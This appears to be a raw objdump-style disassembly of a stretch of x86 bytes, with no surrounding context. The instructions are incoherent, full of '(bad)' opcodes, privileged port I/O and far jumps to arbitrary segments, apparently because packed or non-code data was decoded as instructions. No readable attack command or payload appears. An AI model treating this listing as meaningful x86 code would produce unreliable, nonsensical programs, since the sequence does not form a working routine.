  4077f1:	jns    0x4077f2
  4077f3:	fstp   QWORD PTR ds:0xbc7db205
  4077f9:	mov    ds:0xa711a826,eax
  4077fe:	mov    dl,0x4
  407800:	adc    ecx,DWORD PTR [ecx]
  407802:	fisub  WORD PTR [ecx+0x499cd13]
  407808:	daa    
  407809:	inc    edx
  40780a:	neg    cl
  40780c:	shld   DWORD PTR [edx],eax,0x42
  407810:	adc    eax,DWORD PTR [esi-0x1]
  407813:	mov    ds:0x2c9463b2,eax
  407818:	and    DWORD PTR [eax],edx
  40781a:	mov    eax,ds:0x406328a4
  40781f:	ins    BYTE PTR es:[edi],dx
  407820:	in     eax,0x3e
  407822:	jmp    0xed77:0xc0f9f8b
  407829:	push   gs
  40782b:	add    ah,BYTE PTR [ecx]
  40782d:	push   ebx
  40782e:	or     al,0x5d
  407830:	(bad)  
  407831:	into   
  407832:	cmp    eax,0x360f8cdb
  407837:	sbb    eax,0xf943737f
  40783c:	ror    BYTE PTR [esi+0x6c],0xdb
  407840:	inc    esi
  407841:	mov    eax,ds:0x556c5950
  407846:	mov    ah,0x3e
  407848:	mov    dl,0x2f
  40784a:	sub    DWORD PTR [eax-0x62a9a4df],0x9
  407851:	in     eax,0x11
  407853:	ins    BYTE PTR es:[edi],dx
  407854:	pushf  
  407855:	xor    ch,BYTE PTR [ecx-0x6b]
  407858:	cmp    ebp,eax
  40785a:	fwait
  40785b:	or     al,0x2e
  40785d:	pop    ss
  40785e:	xor    eax,0x6cba7c69
  407863:	sbb    edi,eax
  407865:	xlat   BYTE PTR ds:[ebx]
  407866:	hlt    
  407867:	xlat   BYTE PTR ds:[ebx]
  407868:	neg    DWORD PTR [eax+0x8]
  40786b:	jmp    0xb143:0x50da9227
  407872:	nop
  407873:	pop    ebp
  407874:	pop    esi
  407875:	je     0x40782c
  407877:	ret    0x80df
  40787a:	fld    QWORD PTR [ebx]
  40787c:	icebp  
  40787d:	mov    eax,0xf93046d8
  407882:	mov    esi,0xa3e97280
  407887:	popf   
  407888:	sbb    dh,dh
  40788a:	inc    edi
  40788b:	das    
  40788c:	pop    esp
  40788d:	adc    edi,DWORD PTR [ecx+0x6e09493b]
  407893:	mov    dl,BYTE PTR [esi+0x2e40fb0b]
  407899:	mov    esi,0xd4bc03f6
  40789e:	out    0x10,eax
  4078a0:	or     DWORD PTR [ebx+0x44],0x44761c14
  4078a7:	pop    ds
  4078a8:	mov    bh,0x8b
  4078aa:	pop    esi
  4078ab:	lods   al,BYTE PTR ds:[esi]
  4078ac:	fadd   DWORD PTR [ecx-0x51]
  4078af:	adc    DWORD PTR [edi-0x4e265892],edx
  4078b5:	fdivr  QWORD PTR [eax]
  4078b7:	dec    esi
  4078b8:	xlat   BYTE PTR ds:[ebx]
  4078b9:	jb     0x4078d7
  4078bb:	leave  
  4078bc:	dec    eax
  4078bd:	adc    bh,BYTE PTR [eax+0x6787947f]
  4078c3:	mov    ah,BYTE PTR [esi+0x7cf4a62d]
  4078c9:	ror    DWORD PTR [ecx+edi*4],1
  4078cc:	stos   BYTE PTR es:[edi],al
  4078cd:	xor    eax,0xd6986be5
  4078d2:	nop
  4078d3:	or     DWORD PTR [eax-0x1134b6d4],ebp
  4078d9:	inc    ebp
  4078da:	sbb    ah,BYTE PTR [ecx+0x614b494c]
  4078e0:	(bad)  
  4078e1:	in     al,0xbe
  4078e3:	mov    dh,0xc7
  4078e5:	pop    es
  4078e6:	mov    al,0x2
  4078e8:	(bad)  
  4078e9:	or     esi,eax
  4078eb:	xchg   esi,eax
  4078ec:	or     al,0x63
  4078ee:	loope  0x407895
  4078f0:	je     0x407924
  4078f2:	or     al,0x41
  4078f4:	cmp    ebx,DWORD PTR ds:0xde2ee797
  4078fa:	xor    al,0x97
  4078fc:	ficomp WORD PTR [eax]
  4078fe:	push   edi
  4078ff:	je     0x40792e
  407901:	out    dx,al
  407902:	add    al,0x5e
  407904:	pop    edi
  407905:	stos   DWORD PTR es:[edi],eax
  407906:	sub    al,0x13
  407908:	add    ah,BYTE PTR [eax]
  40790a:	leave  
  40790b:	les    esp,FWORD PTR [ecx-0x6c]
  40790e:	retf   0xb714
  407911:	in     al,0x49
  407913:	(bad)  
  407914:	dec    edi
  407915:	std    
  407916:	mov    bl,0x1
  407918:	mov    DWORD PTR [esi+0x76440e5c],0x578c64e9
  407922:	push   es
  407923:	add    BYTE PTR [ecx-0x437eceb],dl
  407929:	jno    0x407950
  40792b:	xor    ah,cl
  40792d:	gs and bl,dh
  407930:	cmp    al,0xa0
  407932:	neg    BYTE PTR [esi]
  407934:	fistp  QWORD PTR [edi-0x72]
  407937:	adc    cl,bl
  407939:	cdq    
  40793a:	in     al,dx
  40793b:	xchg   ebx,eax
  40793c:	pop    ebx
  40793d:	popa   
  40793e:	sub    BYTE PTR [edx],ch
  407940:	stos   DWORD PTR es:[edi],eax
  407941:	xchg   ebp,eax
  407942:	jae    0x4079b9
  407944:	in     al,0xac
  407946:	inc    ebp
  407947:	push   ebp
  407948:	push   ss
  407949:	or     ebp,DWORD PTR [edi-0xd]
  40794c:	leave  
  40794d:	cwde   
  40794e:	add    ebp,DWORD PTR [ebp+0x3d63f211]
  407954:	sbb    BYTE PTR [ebp+0x489bbaa4],dl
  40795a:	lods   al,BYTE PTR ds:[esi]
  40795b:	dec    ebp
  40795c:	shl    DWORD PTR [edi-0x23],1
  40795f:	sub    eax,esp
  407961:	push   esp
  407962:	sti    
  407963:	jnp    0x407930
  407965:	and    cl,ah
  407967:	dec    esp
  407968:	repnz sbb ebx,DWORD PTR [edi+0x65c1bb1]
  40796f:	stc    
  407970:	push   0xc244a507
  407975:	shl    BYTE PTR es:[eax+edi*2-0x6b],cl
  40797a:	cli    
  40797b:	dec    edi
  40797c:	xchg   BYTE PTR [ebx-0x23],bl
  40797f:	inc    ebp
  407980:	inc    ecx
  407981:	pop    ss
  407982:	into   
  407983:	fistp  DWORD PTR [edx-0x7]
  407986:	stos   DWORD PTR es:[edi],eax
  407987:	inc    esp
  407988:	repnz sub BYTE PTR [edx-0x3c],ah
  40798c:	mov    dh,0x83
  40798e:	stc    
  40798f:	clc    
  407990:	shl    BYTE PTR [ecx-0x4b],1
  407993:	repz sbb esi,esp
  407996:	sti    
  407997:	sbb    ecx,ebp
  407999:	nop
  40799a:	(bad)  
  40799b:	in     al,0x3d
  40799d:	xchg   ah,ch
  40799f:	shl    DWORD PTR [edi+ecx*4-0x380e7aff],1
  4079a6:	loopne 0x4079c3
  4079a8:	mov    ebp,0x376b9279
  4079ad:	or     DWORD PTR [ebx],edi
  4079af:	(bad)  
  4079b0:	mov    dh,dh
  4079b2:	out    dx,al
  4079b3:	retf   
  4079b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b5:	into   
  4079b6:	jo     0x407a29
  4079b8:	xchg   edi,eax
  4079b9:	ins    DWORD PTR es:[edi],dx
  4079ba:	xchg   edx,eax
  4079bb:	icebp  
  4079bc:	dec    ecx
  4079bd:	sub    DWORD PTR [esi-0xff25024],eax
  4079c3:	xchg   ecx,eax
  4079c4:	pop    edi
  4079c5:	mov    ch,0x48
  4079c7:	test   al,0x49
  4079c9:	jle    0x407998
  4079cb:	popf   
  4079cc:	xchg   DWORD PTR [ebp+0x44d4b56b],edx
  4079d2:	cli    
  4079d3:	aaa    
  4079d4:	xchg   ecx,eax
  4079d5:	inc    edi
  4079d6:	push   es
  4079d7:	push   edi
  4079d8:	push   bx
  4079da:	inc    ebx
  4079db:	add    BYTE PTR [edx],ah
  4079dd:	xchg   esi,eax
  4079de:	xor    DWORD PTR [edi+0x78],ebx
  4079e1:	mov    ch,0x7e
  4079e3:	cmp    DWORD PTR [edx],0xca12a257
  4079e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ea:	std    
  4079eb:	call   0x3cab:0x4a87a984
  4079f2:	out    0x8e,eax
  4079f4:	cwde   
  4079f5:	jnp    0x4079e8
  4079f7:	mov    WORD PTR ds:[edi+0x49],cs
  4079fb:	test   esp,ebp
  4079fd:	pop    edi
  4079fe:	leave  
  4079ff:	cli    
  407a00:	and    bl,ch
  407a02:	clc    
  407a03:	in     al,0xef
  407a05:	jmp    0xbe6ef51d
  407a0a:	bound  esi,QWORD PTR [ebx*8-0x4ccc4fd1]
  407a11:	mov    BYTE PTR [ecx+0x2],cl
  407a14:	mov    ecx,0x87eda380
  407a19:	jmp    0x4a3e:0x80a2490d
  407a20:	jmp    0xcd7fb134
  407a25:	leave  
  407a26:	xor    eax,0x7b7942bd
  407a2b:	retf   
  407a2c:	test   BYTE PTR [eax-0xc],dh
  407a2f:	sbb    BYTE PTR [ebx],dl
  407a31:	xor    DWORD PTR [edi],0x674be157
  407a37:	sar    BYTE PTR [edi],1
  407a39:	bound  esp,QWORD PTR [edx+0x68589450]
  407a3f:	outs   dx,BYTE PTR ds:[esi]
  407a40:	out    0xef,eax
  407a42:	sbb    cl,BYTE PTR [ebx+0x30]
  407a45:	ds jl  0x4079d1
  407a48:	aaa    
  407a49:	sub    dh,ah
  407a4b:	mov    ecx,0x79e3d9ba
  407a50:	inc    esi
  407a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a52:	add    eax,0x70809bef
  407a57:	jp     0x407a6f
  407a59:	rol    DWORD PTR [eax+0x6d03d994],cl
  407a5f:	gs ds sub bh,BYTE PTR es:[eax+0x3d]
  407a65:	jbe    0x407a87
  407a67:	lods   eax,DWORD PTR ds:[esi]
  407a68:	(bad)  
  407a69:	adc    edx,DWORD PTR [ebx]
  407a6b:	arpl   WORD PTR [edx+eiz*8+0xd],di
  407a6f:	jbe    0x407a5d
  407a71:	jne    0x407a0e
  407a73:	popf   
  407a74:	pop    edx
  407a75:	push   ebp
  407a76:	sub    al,0xae
  407a78:	in     al,0x5a
  407a7a:	int3   
  407a7b:	mov    cl,0xe5
  407a7d:	push   ss
  407a7e:	pushf  
  407a7f:	xor    ebx,DWORD PTR [edi-0x6e]
  407a82:	mov    al,ds:0xff7cf60e
  407a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a88:	and    eax,0x1d94f428
  407a8d:	cmc    
  407a8e:	mov    bl,0xf1
  407a90:	push   ecx
  407a91:	mov    ah,0xa2
  407a93:	lods   eax,DWORD PTR ds:[esi]
  407a94:	inc    eax
  407a95:	lahf   
  407a96:	mov    ds:0xb71f37a3,al
  407a9b:	cmc    
  407a9c:	mov    ah,dh
  407a9e:	call   0xcece:0xee1853b
  407aa5:	xchg   edi,eax
  407aa6:	jne    0x407a93
  407aa8:	rol    cl,1
  407aaa:	into   
  407aab:	sbb    al,0x5f
  407aad:	pop    ebp
  407aae:	in     al,dx
  407aaf:	(bad)  [ebp-0x79]
  407ab2:	mov    cl,0x6b
  407ab4:	sahf   
  407ab5:	lahf   
  407ab6:	mov    ecx,0x7841465c
  407abb:	mov    dh,0x5d
  407abd:	cmp    dh,BYTE PTR [esi-0x15]
  407ac0:	pop    ebx
  407ac1:	ss jl  0x407abb
  407ac4:	out    0xd0,eax
  407ac6:	arpl   WORD PTR [eax+0x708ae048],ax
  407acc:	stos   DWORD PTR es:[edi],eax
  407acd:	es inc ebp
  407acf:	adc    al,0xf1
  407ad1:	mov    dl,0xf4
  407ad3:	enter  0x7276,0x52
  407ad7:	pop    eax
  407ad8:	in     eax,dx
  407ad9:	leave  
  407ada:	stos   BYTE PTR es:[edi],al
  407adb:	pop    esi
  407adc:	jmp    0x407ac4
  407ade:	out    0xdc,al
  407ae0:	push   es
  407ae1:	stos   DWORD PTR es:[edi],eax
  407ae2:	js     0x407b51
  407ae4:	push   edx
  407ae5:	mov    ds:0xcef6e9fb,eax
  407aea:	cld    
  407aeb:	cli    
  407aec:	mov    esi,ebp
  407aee:	inc    esp
  407aef:	loope  0x407a94
  407af1:	xchg   esi,eax
  407af2:	adc    dl,bh
  407af4:	and    DWORD PTR [edi],esi
  407af6:	dec    edx
  407af7:	mov    eax,0x2b6a8af6
  407afc:	mov    cl,BYTE PTR [ebx]
  407afe:	xchg   esi,eax
  407aff:	add    cl,BYTE PTR [eax+0x5658851]
  407b05:	fdivr  QWORD PTR [edx-0x39867143]
  407b0b:	mov    bh,0x9
  407b0d:	pop    ds
  407b0e:	sbb    edi,DWORD PTR [esi+0x59]
  407b11:	push   ebp
  407b12:	ret    
  407b13:	and    DWORD PTR [eax+0x66],0x6779138a
  407b1a:	xor    BYTE PTR ds:0xb228e40a,cl
  407b20:	daa    
  407b21:	jmp    0xc9a8:0xc47237db
  407b28:	pop    esi
  407b29:	or     BYTE PTR [ebp-0x67],bl
  407b2c:	imul   ecx
  407b2e:	mov    dh,0xdd
  407b30:	in     eax,dx
  407b31:	cs inc edx
  407b33:	stc    
  407b34:	and    ebx,DWORD PTR [ecx]
  407b36:	clc    
  407b37:	or     al,bl
  407b39:	add    BYTE PTR [ecx],ah
  407b3b:	pop    edx
  407b3c:	inc    eax
  407b3d:	sbb    al,0x10
  407b3f:	jno    0x407b79
  407b41:	mov    edi,0xd5b1b1b2
  407b46:	arpl   WORD PTR [ecx+0x6a],cx
  407b49:	add    ah,BYTE PTR [edi-0x7d]
  407b4c:	fcomp  QWORD PTR [edi]
  407b4e:	mov    ebp,0x8988cc6d
  407b53:	loop   0x407b18
  407b55:	jmp    0x407af6
  407b57:	adc    ebp,DWORD PTR [edx]
  407b59:	push   ds
  407b5a:	dec    eax
  407b5b:	sbb    BYTE PTR [edx],bl
  407b5d:	dec    eax
  407b5e:	stc    
  407b5f:	cwde   
  407b60:	arpl   WORD PTR [eax],di
  407b62:	enter  0x2641,0x30
  407b66:	lea    edi,[ebx]
  407b68:	jno    0x407b73
  407b6a:	pop    esi
  407b6b:	xor    edi,ecx
  407b6d:	fs push cs
  407b6f:	das    
  407b70:	scas   al,BYTE PTR es:[edi]
  407b71:	test   eax,0x27e92ff9
  407b76:	jmp    FWORD PTR [edx+0x57d3edcb]
  407b7c:	adc    eax,0x4c31b470
  407b81:	sub    BYTE PTR [ebx],ah
  407b83:	or     BYTE PTR [ebp+0x1e5764d7],ah
  407b89:	out    0x24,al
  407b8b:	test   edx,eax
  407b8d:	popa   
  407b8e:	scas   al,BYTE PTR es:[edi]
  407b8f:	imul   esi,DWORD PTR [ebp-0x2d],0x4a1133f8
  407b96:	sub    DWORD PTR [eax-0x77],esi
  407b99:	jp     0x407bba
  407b9b:	pop    edx
  407b9c:	into   
  407b9d:	sub    BYTE PTR [ebp-0x5718eb46],cl
  407ba3:	fistp  DWORD PTR [edx+0x1645cda2]
  407ba9:	scas   al,BYTE PTR es:[edi]
  407baa:	arpl   WORD PTR [eax+0x2],ax
  407bad:	jl     0x407c0c
  407baf:	out    dx,eax
  407bb0:	lods   eax,DWORD PTR ds:[esi]
  407bb1:	jne    0x407c08
  407bb3:	jno    0x407ba3
  407bb5:	out    0x21,al
  407bb7:	pop    ecx
  407bb8:	cmp    BYTE PTR ds:0xfccf2d16,ch
  407bbe:	sbb    al,0x8d
  407bc0:	cs sub eax,0xc5c79f06
  407bc6:	popf   
  407bc7:	adc    eax,0x7215156f
  407bcc:	dec    eax
  407bcd:	jge    0x407c0a
  407bcf:	jge    0x407baf
  407bd1:	add    eax,0xd4ad8d2b
  407bd6:	cmp    edi,DWORD PTR [esi-0x46d9d7ff]
  407bdc:	fcomp  st(3)
  407bde:	mov    bl,0x2c
  407be0:	fchs   
  407be2:	in     eax,dx
  407be3:	imul   eax,DWORD PTR [ebx+0x5c8a5589],0x4c019382
  407bed:	into   
  407bee:	jecxz  0x407b8e
  407bf0:	ss jmp 0x407c4e
  407bf3:	in     al,0xed
  407bf5:	nop
  407bf6:	fs push ebp
  407bf8:	cmp    edx,0x54
  407bfb:	jb     0x407bd4
  407bfd:	or     eax,0x13935bd9
  407c02:	fnstsw WORD PTR [ebp+edi*4+0x75b78582]
  407c09:	fdivr  DWORD PTR [esi]
  407c0b:	mov    al,ds:0x3c7cf26f
  407c10:	fstp   QWORD PTR [edi+0x5c]
  407c13:	adc    eax,0x22f410fa
  407c18:	mov    ah,0xb
  407c1a:	jmp    0xd540:0xd28a564
  407c21:	jne    0x407c52
  407c23:	pop    esi
  407c24:	push   edi
  407c25:	bound  ebx,QWORD PTR [eax-0x6218ef3]
  407c2b:	pop    edi
  407c2c:	(bad)  
  407c2d:	or     al,0xb6
  407c2f:	out    0x83,al
  407c31:	imul   edx,edx,0xa574b334
  407c37:	cmp    esp,edx
  407c39:	and    al,0x47
  407c3b:	xchg   ebp,eax
  407c3c:	call   0xeda1:0xdad6cfd
  407c43:	sbb    eax,DWORD PTR ds:0x51e825b9
  407c49:	dec    ecx
  407c4a:	push   eax
  407c4b:	je     0x407c50
  407c4d:	mov    al,es:0x60b4d544
  407c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c54:	popa   
  407c55:	or     ch,BYTE PTR [esi+0x1]
  407c58:	inc    ecx
  407c59:	shl    BYTE PTR [eax-0x461f6213],0x2a
  407c60:	xor    ch,BYTE PTR [edi]
  407c62:	pop    edx
  407c63:	inc    esi
  407c64:	aad    0x85
  407c66:	mov    dh,dh
  407c68:	neg    BYTE PTR [eax+0x31e26631]
  407c6e:	inc    edx
  407c6f:	popf   
  407c70:	js     0x407c49
  407c72:	pop    ecx
  407c73:	push   es
  407c74:	adc    BYTE PTR [edx],bh
  407c76:	jnp    0x407ced
  407c78:	and    al,0x93
  407c7a:	jns    0x407c91
  407c7c:	pop    edx
  407c7d:	iret   
  407c7e:	xchg   esi,eax
  407c7f:	adc    BYTE PTR [eax],al
  407c81:	(bad)  
  407c82:	fscale 
  407c84:	push   eax
  407c85:	xor    ebp,DWORD PTR [edx+eiz*2+0x69f6606]
  407c8c:	ret    0xfbb1
  407c8f:	jecxz  0x407c7f
  407c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c92:	mov    DWORD PTR [edi-0xe],esp
  407c95:	cmc    
  407c96:	mov    WORD PTR [esi-0x72],gs
  407c99:	(bad)  
  407c9a:	pop    ds
  407c9b:	push   esi
  407c9c:	jg     0x407c4e
  407c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c9f:	clc    
  407ca0:	or     BYTE PTR [ecx+0x6d],ah
  407ca3:	adc    esp,0xf23676e7
  407ca9:	jb     0x407c4a
  407cab:	cmp    al,0xa5
  407cad:	adc    edi,DWORD PTR [edi+0x53]
  407cb0:	int    0x3f
  407cb2:	mov    cl,0xb9
  407cb4:	fidiv  DWORD PTR [edi-0x3c]
  407cb7:	push   esi
  407cb8:	mov    eax,ds:0xf70adbc
  407cbd:	(bad)  
  407cbe:	jo     0x407cf5
  407cc0:	sbb    DWORD PTR [ecx],ecx
  407cc2:	mov    edi,DWORD PTR [eax+0x7483e976]
  407cc8:	add    DWORD PTR [ebx+0x67],eax
  407ccb:	jnp    0x407c8d
  407ccd:	int    0xbd
  407ccf:	dec    ebp
  407cd0:	stos   BYTE PTR es:[edi],al
  407cd1:	push   es
  407cd2:	or     bh,BYTE PTR [edx+0x77d6ae80]
  407cd8:	xor    eax,0x14578a15
  407cdd:	ds jb  0x407c99
  407ce0:	mov    ebx,0x6cab8e89
  407ce5:	inc    ecx
  407ce6:	dec    esp
  407ce7:	retf   0x846
  407cea:	maxps  xmm2,XMMWORD PTR [eax-0x11]
  407cee:	fdivp  st(3),st
  407cf0:	or     eax,0x550281b6
  407cf5:	(bad)  
  407cf6:	or     ch,ah
  407cf8:	xor    al,0x2a
  407cfa:	xchg   ebp,eax
  407cfb:	ror    BYTE PTR [ecx+0x6f],cl
  407cfe:	jg     0x407ccd
  407d00:	sahf   
  407d01:	xchg   eax,edx
  407d03:	pop    ss
  407d04:	(bad)  
  407d05:	popf   
  407d06:	fimul  WORD PTR [ebx-0x20179f8]
  407d0c:	lods   eax,DWORD PTR ds:[esi]
  407d0d:	or     al,0x4a
  407d0f:	sbb    DWORD PTR [ecx+edx*8-0x1d],eax
  407d13:	or     esp,DWORD PTR [esi-0x1f]
  407d16:	mov    bl,0x90
  407d18:	ins    BYTE PTR es:[edi],dx
  407d19:	imul   esp,DWORD PTR [ebx+0x22],0x2e
  407d1d:	mov    edx,0x64973cc
  407d22:	jae    0x407d70
  407d24:	pusha  
  407d25:	lods   al,BYTE PTR ds:[esi]
  407d26:	sbb    eax,0x87f7e1be
  407d2b:	dec    eax
  407d2c:	les    ebx,FWORD PTR [eax+esi*2-0x57]
  407d30:	pop    es
  407d31:	and    ecx,esp
  407d33:	test   al,0x7b
  407d35:	and    ch,0xe7
  407d38:	js     0x407cda
  407d3a:	pop    eax
  407d3b:	cmp    eax,0x907bf371
  407d40:	in     eax,dx
  407d41:	jl     0x407d09
  407d43:	mov    esp,0x6494c976
  407d48:	jle    0x407ce1
  407d4a:	stos   DWORD PTR es:[edi],eax
  407d4b:	daa    
  407d4c:	nop
  407d4d:	ret    
  407d4e:	rol    bl,0x64
  407d51:	aas    
  407d52:	cld    
  407d53:	xor    cl,bh
  407d55:	push   edx
  407d56:	scas   al,BYTE PTR es:[edi]
  407d57:	jge    0x407d72
  407d59:	outs   dx,BYTE PTR ds:[esi]
  407d5a:	cmp    eax,0x77bd2781
  407d5f:	mov    eax,ds:0x6739da71
  407d64:	test   eax,0xaa329b01
  407d69:	enter  0xf2ec,0xf1
  407d6d:	sbb    cl,BYTE PTR [edx-0x48]
  407d70:	dec    eax
  407d71:	pop    ebp
  407d72:	push   ecx
  407d73:	rcr    ch,1
  407d75:	mov    ecx,0x4b843c15
  407d7a:	daa    
  407d7b:	jae    0x407dea
  407d7d:	lahf   
  407d7e:	sub    DWORD PTR [ecx],0xffffff92
  407d81:	loopne 0x407d6b
  407d83:	push   ebp
  407d84:	xor    DWORD PTR [eax],0x62
  407d87:	dec    ebp
  407d88:	pop    edi
  407d89:	in     al,0x13
  407d8b:	jae    0x407d1d
  407d8d:	jge    0x407d4b
  407d8f:	int3   
  407d90:	xor    bl,BYTE PTR [ecx]
  407d92:	pop    ds
  407d93:	daa    
  407d94:	mov    dh,0xdf
  407d96:	xchg   DWORD PTR [edx],esp
  407d98:	lds    esi,FWORD PTR [edx+eax*8-0x3f3a7256]
  407d9f:	stos   DWORD PTR es:[edi],eax
  407da0:	and    eax,0xacc8ffe5
  407da5:	mov    eax,0x568fdf38
  407daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dab:	ss pop esp
  407dad:	mov    al,ds:0x5eb480c5
  407db2:	call   0x41c3284a
  407db7:	mov    ds:0xbbd53fa3,al
  407dbc:	mov    ds:0x2688c564,eax
  407dc1:	and    esi,esi
  407dc3:	div    edi
  407dc5:	mov    ebx,0x96973bfd
  407dca:	mov    cl,0x6e
  407dcc:	mov    bl,0xf1
  407dce:	fdiv   DWORD PTR [ebx-0x37]
  407dd1:	(bad)  
  407dd2:	jmp    0x571947e2
  407dd7:	jmp    DWORD PTR [edx]
  407dd9:	addr16 ja 0x407e5a
  407ddc:	push   eax
  407ddd:	mov    ds:0x91ab2bf2,eax
  407de2:	mov    dh,dh
  407de4:	mov    dh,0x99
  407de6:	push   eax
  407de7:	cmp    ah,BYTE PTR [edx-0x168e8e9e]
  407ded:	ins    DWORD PTR es:[edi],dx
  407dee:	sti    
  407def:	mov    eax,ds:0x90f55cc0
  407df4:	jmp    0x26b:0xa0311635
  407dfb:	xchg   edx,eax
  407dfc:	inc    ecx
  407dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dfe:	jae    0x407db4
  407e00:	jo     0x407e1b
  407e02:	pop    edi
  407e03:	push   esi
  407e04:	popf   
  407e05:	xchg   ebx,eax
  407e06:	mov    esi,0xafd3751f
  407e0b:	xor    eax,0xb36155a9
  407e10:	mov    BYTE PTR [ebx],dh
  407e12:	int3   
  407e13:	and    edx,DWORD PTR [edi-0x5a9e1e29]
  407e19:	pop    eax
  407e1a:	sub    DWORD PTR ds:[edx+edx*2],0x90125f07
  407e22:	cld    
  407e23:	montmul (bad)
  407e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e25:	add    edx,ecx
  407e27:	test   DWORD PTR [eax-0x46193ae5],edi
  407e2d:	call   0xab34951c
  407e32:	call   0x603c:0x8ff319c1
  407e39:	and    DWORD PTR [ebp-0x2f],ebx
  407e3c:	(bad)  
  407e3d:	aam    0xe
  407e3f:	and    eax,0x9fb78636
  407e44:	xor    esp,DWORD PTR [esi+0x60338f44]
  407e4a:	jecxz  0x407e49
  407e4c:	mov    bl,0xa5
  407e4e:	loope  0x407dd9
  407e50:	mov    BYTE PTR [ebx],dh
  407e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e53:	jne    0x407eb1
  407e55:	int3   
  407e56:	(bad)  
  407e57:	repnz and ch,BYTE PTR [ecx+esi*8]
  407e5b:	ss add ebx,ebx
  407e5e:	cmp    ah,0xcd
  407e61:	out    dx,al
  407e62:	sahf   
  407e63:	js     0x407e12
  407e65:	dec    ebp
  407e66:	mov    ah,0x8b
  407e68:	arpl   ax,dx
  407e6a:	clc    
  407e6b:	inc    ecx
  407e6c:	add    bh,BYTE PTR [eax+0x14f57dcb]
  407e72:	mov    ecx,0xa59cb8d9
  407e77:	cs jae 0x407e02
  407e7a:	push   ecx
  407e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e7c:	dec    esp
  407e7d:	sbb    DWORD PTR [edi],edx
  407e7f:	jg     0x407eb1
  407e81:	je     0x407e7d
  407e83:	cmp    al,BYTE PTR [eax+0x7c292e11]
  407e89:	(bad)  
  407e8a:	fldl2e 
  407e8c:	sub    BYTE PTR [ebx+0x3f],dl
  407e8f:	adc    cl,BYTE PTR [eax]
  407e91:	jo     0x407e68
  407e93:	adc    DWORD PTR [esi+0x15],0xffffff9d
  407e97:	mov    WORD PTR [ecx+0x275dcabe],es
  407e9d:	ins    DWORD PTR es:[edi],dx
  407e9e:	push   cs
  407e9f:	pop    esi
  407ea0:	dec    ecx
  407ea1:	mov    eax,0xbf6473d3
  407ea6:	(bad)  
  407ea7:	and    eax,0xbf722416
  407eac:	call   0xd189:0xc685f96b
  407eb3:	mov    edi,DWORD PTR [edx+0x7ce02456]
  407eb9:	inc    ebp
  407eba:	aas    
  407ebb:	popa   
  407ebc:	inc    edx
  407ebd:	pop    ecx
  407ebe:	sbb    DWORD PTR [edx],ebx
  407ec0:	push   esi
  407ec1:	jae    0x407ea0
  407ec3:	jbe    0x407f13
  407ec5:	adc    eax,ecx
  407ec7:	imul   esi,esp,0x4d
  407eca:	pop    eax
  407ecb:	out    0x10,al
  407ecd:	(bad)  
  407ece:	lock fild QWORD PTR [ecx+0x6c4d4682]
  407ed5:	int    0x21
  407ed7:	mov    ch,0xb7
  407ed9:	mov    edi,0xa05763e3
  407ede:	mov    al,BYTE PTR [ecx+ecx*4+0x736d1843]
  407ee5:	cmp    bl,BYTE PTR [edx+eax*2-0x34878eaf]
  407eec:	inc    ecx
  407eed:	sbb    eax,esi
  407eef:	mov    edx,0x55d5fee8
  407ef4:	cmp    bh,BYTE PTR [eax-0x65]
  407ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ef8:	aad    0x40
  407efa:	dec    esp
  407efb:	(bad)  
  407efc:	or     edi,edx
  407efe:	push   ss
  407eff:	sbb    DWORD PTR [ebx+0x4b],esp
  407f02:	pop    ebx
  407f03:	and    BYTE PTR [edx],ah
  407f05:	stos   DWORD PTR es:[edi],eax
  407f06:	pop    ebx
  407f07:	mov    al,ds:0x9e14da4e
  407f0c:	test   al,0xa8
  407f0e:	iret   
  407f0f:	mov    bl,0xdc
  407f11:	inc    ecx
  407f12:	out    0xd3,eax
  407f14:	push   edi
  407f15:	in     al,dx
  407f16:	(bad)  
  407f17:	loopne 0x407f2a
  407f19:	push   cs
  407f1a:	in     eax,0xfa
  407f1c:	adc    DWORD PTR [edx+ebx*8-0x2],edi
  407f20:	sar    DWORD PTR [esp+edi*2-0x703ee77b],cl
  407f27:	xchg   BYTE PTR [ecx+ecx*1+0x135bf8c],dl
  407f2e:	push   esi
  407f2f:	fwait
  407f30:	bnd jne 0x407f09
  407f33:	or     eax,0x8bf25218
  407f38:	dec    ebx
  407f39:	aas    
  407f3a:	push   ebx
  407f3b:	ds scas eax,DWORD PTR es:[edi]
  407f3d:	popa   
  407f3e:	adc    DWORD PTR [eax-0x43a9a808],edi
  407f44:	(bad)  
  407f45:	mov    dl,0x45
  407f47:	aas    
  407f48:	mov    al,ds:0xd00c0fb8
  407f4d:	shr    BYTE PTR [ebp+0x475aa931],0xf9
  407f54:	ins    DWORD PTR es:[edi],dx
  407f55:	aaa    
  407f56:	xor    BYTE PTR [esp+ebp*1+0x7278f33e],al
  407f5d:	sar    DWORD PTR [edi+esi*1+0x1a1e38f2],1
  407f64:	xchg   edx,eax
  407f65:	icebp  
  407f66:	stos   DWORD PTR es:[edi],eax
  407f67:	repz cli 
  407f69:	aaa    
  407f6a:	lds    eax,FWORD PTR [ebx]
  407f6c:	fidivr DWORD PTR [ebx]
  407f6e:	hlt    
  407f6f:	in     al,dx
  407f70:	das    
  407f71:	ins    DWORD PTR es:[edi],dx
  407f72:	daa    
  407f73:	sbb    al,0x41
  407f75:	leave  
  407f76:	in     eax,dx
  407f77:	fldcw  WORD PTR [edi+0x74]
  407f7a:	addr16 xchg ebx,eax
  407f7c:	mov    ch,0x9c
  407f7e:	mov    dh,0x14
  407f80:	inc    ebp
  407f81:	enter  0x3ce1,0x68
  407f85:	sti    
  407f86:	dec    esp
  407f87:	shl    BYTE PTR [ecx+0x7e2e2f93],0x4c
  407f8e:	daa    
  407f8f:	out    0x6a,eax
  407f91:	jmp    0x407fe1
